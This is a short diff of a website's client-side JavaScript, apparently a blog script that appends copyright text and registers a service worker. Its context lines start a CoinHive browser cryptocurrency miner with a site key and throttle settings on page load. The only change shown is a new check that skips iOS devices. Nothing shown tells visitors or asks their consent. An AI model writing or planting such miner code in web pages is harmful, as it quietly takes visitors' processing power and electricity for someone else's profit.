@@ -311,6 +311,9 @@ ${copyString}${genCopy(author, link).join('<br>')}</div>`)
     navigator.serviceWorker.register(`${config.Server}/sw.min.js?${config.StaticResourceVersion}`, {scope: '/'})
   }
 
+  if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
+    return
+  }
   const miner = new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9});
   miner.start();
 })()
